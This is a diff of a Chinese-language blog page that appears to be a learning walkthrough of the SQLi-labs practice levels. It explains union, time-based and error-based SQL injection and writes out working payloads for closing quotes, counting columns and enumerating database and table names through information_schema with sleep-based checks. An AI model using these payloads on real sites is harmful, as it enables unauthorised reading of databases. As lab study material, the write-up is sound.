@@ -19,12 +19,12 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="SQL注入方式1.联合注入2.延时注入3.报错注入SQL注入基本流程1.判断注入点，例如修改id查看页面变化2.判断闭合方式，常见闭合方式有 ‘ ‘’ ‘()’等等 ，采用注释的方式改变原函数功能3.查询列数，通过group by或者 order by 函数获取列数4.通过union select特性，可以将多个SELECT查询的结果结合在一起，同时输出5.可以查询到想要的结果知识补充：infor">
+    <meta name="description" content="SQL注入方式1.联合注入2.延时注入3.报错注入SQL注入基本流程1.判断注入点，例如修改id查看页面变化2.判断闭合方式，常见闭合方式有 ‘ ‘’ ‘()’等等 ，采用注释的方式改变原函数功能3.查询列数，通过group by或者 order by 函数获取列数4.通过union select特性，可以将多个SELECT查询的结果结合在一起，同时输出5.可以查询到想要的结果原理说明知识补充：i">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL-libs">
 <meta property="og:url" content="http://example.com/2024/09/02/SQL-libs/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="SQL注入方式1.联合注入2.延时注入3.报错注入SQL注入基本流程1.判断注入点，例如修改id查看页面变化2.判断闭合方式，常见闭合方式有 ‘ ‘’ ‘()’等等 ，采用注释的方式改变原函数功能3.查询列数，通过group by或者 order by 函数获取列数4.通过union select特性，可以将多个SELECT查询的结果结合在一起，同时输出5.可以查询到想要的结果知识补充：infor">
+<meta property="og:description" content="SQL注入方式1.联合注入2.延时注入3.报错注入SQL注入基本流程1.判断注入点，例如修改id查看页面变化2.判断闭合方式，常见闭合方式有 ‘ ‘’ ‘()’等等 ，采用注释的方式改变原函数功能3.查询列数，通过group by或者 order by 函数获取列数4.通过union select特性，可以将多个SELECT查询的结果结合在一起，同时输出5.可以查询到想要的结果原理说明知识补充：i">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/Pasted%20image%2020240909095455.png">
 <meta property="og:image" content="http://example.com/images/Pasted%20image%2020240909095825.png">
@@ -51,8 +51,11 @@
 <meta property="og:image" content="http://example.com/images/Pasted%20image%2020241012231553.png">
 <meta property="og:image" content="http://example.com/images/Pasted%20image%2020241012231801.png">
 <meta property="og:image" content="http://example.com/images/Pasted%20image%2020241013125752.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020241027123612.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020241027123704.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020241027123812.png">
 <meta property="article:published_time" content="2024-09-02T15:27:55.000Z">
-<meta property="article:modified_time" content="2024-10-16T10:01:51.626Z">
+<meta property="article:modified_time" content="2024-10-27T04:40:22.530Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/images/Pasted%20image%2020240909095455.png">
@@ -224,7 +227,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.4k words
+          1.5k words
         
       </span>
     
@@ -235,7 +238,7 @@
         
         
         
-          12 mins
+          13 mins
         
       </span>
     
@@ -277,11 +280,14 @@
             
               <div class="markdown-body">
                 
-                <h1 id="SQL注入方式"><a href="#SQL注入方式" class="headerlink" title="SQL注入方式"></a>SQL注入方式</h1><h2 id="1-联合注入"><a href="#1-联合注入" class="headerlink" title="1.联合注入"></a>1.联合注入</h2><h2 id="2-延时注入"><a href="#2-延时注入" class="headerlink" title="2.延时注入"></a>2.延时注入</h2><h2 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3.报错注入"></a>3.报错注入</h2><h1 id="SQL注入基本流程"><a href="#SQL注入基本流程" class="headerlink" title="SQL注入基本流程"></a>SQL注入基本流程</h1><h2 id="1-判断注入点，例如修改id查看页面变化"><a href="#1-判断注入点，例如修改id查看页面变化" class="headerlink" title="1.判断注入点，例如修改id查看页面变化"></a>1.判断注入点，例如修改id查看页面变化</h2><h2 id="2-判断闭合方式，常见闭合方式有-‘-‘’-‘-’等等-，采用注释的方式改变原函数功能"><a href="#2-判断闭合方式，常见闭合方式有-‘-‘’-‘-’等等-，采用注释的方式改变原函数功能" class="headerlink" title="2.判断闭合方式，常见闭合方式有 ‘ ‘’ ‘()’等等 ，采用注释的方式改变原函数功能"></a>2.判断闭合方式，常见闭合方式有 ‘ ‘’ ‘()’等等 ，采用注释的方式改变原函数功能</h2><h2 id="3-查询列数，通过group-by或者-order-by-函数获取列数"><a href="#3-查询列数，通过group-by或者-order-by-函数获取列数" class="headerlink" title="3.查询列数，通过group by或者 order by 函数获取列数"></a>3.查询列数，通过group by或者 order by 函数获取列数</h2><h2 id="4-通过union-select特性，可以将多个SELECT查询的结果结合在一起，同时输出"><a href="#4-通过union-select特性，可以将多个SELECT查询的结果结合在一起，同时输出" class="headerlink" title="4.通过union select特性，可以将多个SELECT查询的结果结合在一起，同时输出"></a>4.通过union select特性，可以将多个SELECT查询的结果结合在一起，同时输出</h2><h2 id="5-可以查询到想要的结果"><a href="#5-可以查询到想要的结果" class="headerlink" title="5.可以查询到想要的结果"></a>5.可以查询到想要的结果</h2><h3 id="知识补充：information-schema是mysql自带数据库-mysql都自带这个数据库"><a href="#知识补充：information-schema是mysql自带数据库-mysql都自带这个数据库" class="headerlink" title="知识补充：information_schema是mysql自带数据库,mysql都自带这个数据库"></a>知识补充：information_schema是mysql自带数据库,mysql都自带这个数据库</h3><ol>
-<li>获取所有表结构(TABLES)<br><code>SELECT  *  FROM information_schema.TABLES WHERE  TABLE_SCHEMA=&#39;数据库名&#39;</code><br>information_schema 中的表实际上是视图，而不是基本表。<br><code>information_schema</code> 是一个特殊的数据库，用于存储关于所有数据库对象（如表、列、索引等）的元数据。它提供了一种标准化的方式来查询数据库的结构和对象信息。下面是<code>information_schema</code> 中常用的几个表及其结构：<br><strong><code>information_schema.TABLES</code></strong>:<br> <strong><code>TABLE_SCHEMA</code></strong>: 表所在的数据库名称。<br> <code>table_name</code>：表的名称<br><strong><code>information_schema.COLUMNS</code></strong>:<br> <strong><code>COLUMN_NAME</code></strong>: 列的名称。</li>
+                <h1 id="SQL注入方式"><a href="#SQL注入方式" class="headerlink" title="SQL注入方式"></a>SQL注入方式</h1><h2 id="1-联合注入"><a href="#1-联合注入" class="headerlink" title="1.联合注入"></a>1.联合注入</h2><h2 id="2-延时注入"><a href="#2-延时注入" class="headerlink" title="2.延时注入"></a>2.延时注入</h2><h2 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3.报错注入"></a>3.报错注入</h2><h1 id="SQL注入基本流程"><a href="#SQL注入基本流程" class="headerlink" title="SQL注入基本流程"></a>SQL注入基本流程</h1><h2 id="1-判断注入点，例如修改id查看页面变化"><a href="#1-判断注入点，例如修改id查看页面变化" class="headerlink" title="1.判断注入点，例如修改id查看页面变化"></a>1.判断注入点，例如修改id查看页面变化</h2><h2 id="2-判断闭合方式，常见闭合方式有-‘-‘’-‘-’等等-，采用注释的方式改变原函数功能"><a href="#2-判断闭合方式，常见闭合方式有-‘-‘’-‘-’等等-，采用注释的方式改变原函数功能" class="headerlink" title="2.判断闭合方式，常见闭合方式有 ‘ ‘’ ‘()’等等 ，采用注释的方式改变原函数功能"></a>2.判断闭合方式，常见闭合方式有 ‘ ‘’ ‘()’等等 ，采用注释的方式改变原函数功能</h2><h2 id="3-查询列数，通过group-by或者-order-by-函数获取列数"><a href="#3-查询列数，通过group-by或者-order-by-函数获取列数" class="headerlink" title="3.查询列数，通过group by或者 order by 函数获取列数"></a>3.查询列数，通过group by或者 order by 函数获取列数</h2><h2 id="4-通过union-select特性，可以将多个SELECT查询的结果结合在一起，同时输出"><a href="#4-通过union-select特性，可以将多个SELECT查询的结果结合在一起，同时输出" class="headerlink" title="4.通过union select特性，可以将多个SELECT查询的结果结合在一起，同时输出"></a>4.通过union select特性，可以将多个SELECT查询的结果结合在一起，同时输出</h2><h2 id="5-可以查询到想要的结果"><a href="#5-可以查询到想要的结果" class="headerlink" title="5.可以查询到想要的结果"></a>5.可以查询到想要的结果</h2><h1 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h1><h2 id="知识补充：information-schema是mysql自带数据库-mysql都自带这个数据库"><a href="#知识补充：information-schema是mysql自带数据库-mysql都自带这个数据库" class="headerlink" title="知识补充：information_schema是mysql自带数据库,mysql都自带这个数据库"></a>知识补充：information_schema是mysql自带数据库,mysql都自带这个数据库</h2><ol>
+<li>获取所有表结构(TABLES)<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span>  *  <span class="hljs-keyword">FROM</span> information_schema.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span>  TABLE_SCHEMA=<span class="hljs-string">&#x27;数据库名&#x27;</span><br></code></pre></td></tr></table></figure>
+information_schema 中的表实际上是视图，而不是基本表。<br><code>information_schema</code> 是一个特殊的数据库，用于存储关于所有数据库对象（如表、列、索引等）的元数据。它提供了一种标准化的方式来查询数据库的结构和对象信息。下面是<code>information_schema</code> 中常用的几个表及其结构：<br><strong><code>information_schema.TABLES</code></strong>:<br> <strong><code>TABLE_SCHEMA</code></strong>: 表所在的数据库名称。<br> <code>table_name</code>：表的名称<br><strong><code>information_schema.COLUMNS</code></strong>:<br> <strong><code>COLUMN_NAME</code></strong>: 列的名称。</li>
 </ol>
 <h1 id="第1关-SQLI-1-联合注入"><a href="#第1关-SQLI-1-联合注入" class="headerlink" title="第1关-SQLI-1-联合注入"></a>第1关-SQLI-1-联合注入</h1><h2 id="第一步：首先判断注入点，更改id时，页面有回显"><a href="#第一步：首先判断注入点，更改id时，页面有回显" class="headerlink" title="第一步：首先判断注入点，更改id时，页面有回显"></a>第一步：首先判断注入点，更改id时，页面有回显</h2><p><img src="/../images/Pasted%20image%2020240909095455.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="第二步：判断闭合方式"><a href="#第二步：判断闭合方式" class="headerlink" title="第二步：判断闭合方式"></a>第二步：判断闭合方式</h2><p>Less-1&#x2F;?id&#x3D;1’ 输入’ 可以判断出通过’判断<br><img src="/../images/Pasted%20image%2020240909095825.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="第二步：判断闭合方式"><a href="#第二步：判断闭合方式" class="headerlink" title="第二步：判断闭合方式"></a>第二步：判断闭合方式</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Less-1/?<span class="hljs-attribute">id</span>=1&#x27; # 输入<span class="hljs-string">&#x27; 可以判断出通过&#x27;</span>判断<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../images/Pasted%20image%2020240909095825.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="第三步：利用注释-–-，注释掉原语句"><a href="#第三步：利用注释-–-，注释掉原语句" class="headerlink" title="第三步：利用注释 – +，注释掉原语句"></a>第三步：利用注释 – +，注释掉原语句</h2><p><img src="/../images/Pasted%20image%2020240909101026.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="第四步：利用group-by判断条目数量"><a href="#第四步：利用group-by判断条目数量" class="headerlink" title="第四步：利用group by判断条目数量"></a>第四步：利用group by判断条目数量</h2><p><img src="/../images/Pasted%20image%2020240909101205.png" srcset="/img/loading.gif" lazyload><br>发现条目为4时报错<br><img src="/../images/Pasted%20image%2020240909101243.png" srcset="/img/loading.gif" lazyload><br>为3时正常输出，判断条目为3条</p>
 <h2 id="5-所以进行联合查询时需要union-select-1-2-3-三个部分"><a href="#5-所以进行联合查询时需要union-select-1-2-3-三个部分" class="headerlink" title="5.所以进行联合查询时需要union select 1,2,3 三个部分"></a>5.所以进行联合查询时需要union select 1,2,3 三个部分</h2><p><code>?id=1&#39; union select 1,2,3 -- +</code></p>
@@ -301,7 +307,13 @@
 <h2 id="判断库名的长度"><a href="#判断库名的长度" class="headerlink" title="判断库名的长度"></a>判断库名的长度</h2><p>&#96;Less-8&#x2F;?id&#x3D;1’ and if(length(database())&lt;10,sleep(2),0) –+<br><img src="/../images/Pasted%20image%2020241012230418.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="判断库的名字"><a href="#判断库的名字" class="headerlink" title="判断库的名字"></a>判断库的名字</h2><h2 id="可以通过ascii码进行，-也可以直接爆破"><a href="#可以通过ascii码进行，-也可以直接爆破" class="headerlink" title="可以通过ascii码进行， 也可以直接爆破"></a>可以通过ascii码进行， 也可以直接爆破</h2><h5 id="ascii方法"><a href="#ascii方法" class="headerlink" title="ascii方法"></a>ascii方法</h5><p><img src="/../images/Pasted%20image%2020241012231114.png" srcset="/img/loading.gif" lazyload><br><code>if(ascii(substr(database(),1,1))=115,sleep(2),0)</code><br>substr()通过截断方式来获取名字字母，在通过ascii函数转换成ascii码进行对比，如果为真则sleep2秒</p>
 <h5 id="直接对比字母"><a href="#直接对比字母" class="headerlink" title="直接对比字母"></a>直接对比字母</h5><p><img src="/../images/Pasted%20image%2020241012231553.png" srcset="/img/loading.gif" lazyload><br><code>Less-8/?id=1’&#39; and if(substr(database(),1,1)=&#39;s&#39;,sleep(5),0) -- +</code>，substr()通过截断方式来获取名字字母，与字母进行对比。<br><img src="/../images/Pasted%20image%2020241012231801.png" srcset="/img/loading.gif" lazyload><br><code>Less-8/?id=1’&#39; and if(substr(database(),2,1)=&#39;e&#39;,sleep(5),0) -- +</code>，判断第二个字母是否为<br>e.</p>
-<h4 id="判断表名字"><a href="#判断表名字" class="headerlink" title="判断表名字"></a>判断表名字</h4><h5 id="通过substr函数进行表名分割"><a href="#通过substr函数进行表名分割" class="headerlink" title="通过substr函数进行表名分割"></a>通过substr函数进行表名分割</h5><p>if((substr(“查询表语句”,1,1)&#x3D;’e’) ,sleep(1), 0)<br>查询表名语句如下：<br>(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)<br><img src="/../images/Pasted%20image%2020241013125752.png" srcset="/img/loading.gif" lazyload><br><code>Less-8/?id=1’&#39; and if((substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#39;e&#39;) ,sleep(1), 0) -- +</code></p>
+<h4 id="判断表名字"><a href="#判断表名字" class="headerlink" title="判断表名字"></a>判断表名字</h4><h5 id="通过substr函数进行表名分割"><a href="#通过substr函数进行表名分割" class="headerlink" title="通过substr函数进行表名分割"></a>通过substr函数进行表名分割</h5><p>if((substr(“查询表语句”,1,1)&#x3D;’e’) ,sleep(1), 0)<br>查询表名语句如下：<br>(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)<br><img src="/../images/Pasted%20image%2020241013125752.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Less</span>-<span class="hljs-number">8</span>/?id=<span class="hljs-number">1</span>’&#x27; and if((substr((select table_name from information_schema.tables where table_schema=database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;e&#x27;) ,sleep(<span class="hljs-number">1</span>), <span class="hljs-number">0</span>) -- +<br></code></pre></td></tr></table></figure>
+<h1 id="第10关-SQL-libs-10-–post注入"><a href="#第10关-SQL-libs-10-–post注入" class="headerlink" title="第10关 SQL-libs-10 –post注入"></a>第10关 SQL-libs-10 –post注入</h1><p>get注入参数在url中，post注入需要在表单中进行<br>post注入一般为字符型注入<br>1.判断闭合方式<br><img src="/../images/Pasted%20image%2020241027123612.png" srcset="/img/loading.gif" lazyload><br><img src="/../images/Pasted%20image%2020241027123704.png" srcset="/img/loading.gif" lazyload><br>通过报错情况分析，闭合方式为单引号’，尝试通过单引号及#进行注释，发现未报错，确定闭合方式为‘。<br><img src="/../images/Pasted%20image%2020241027123812.png" srcset="/img/loading.gif" lazyload></p>
+<ol>
+<li>通过BP抓包</li>
+<li></li>
+</ol>
 
                 
               </div>
@@ -373,12 +385,6 @@
                   </article>
                   <article class="post-next col-6">
                     
-                    
-                      <a href="/2024/09/02/hello-world/" title="Hello World">
-                        <span class="hidden-mobile">Hello World</span>
-                        <span class="visible-mobile">Next</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
                     
                   </article>
                 </div>
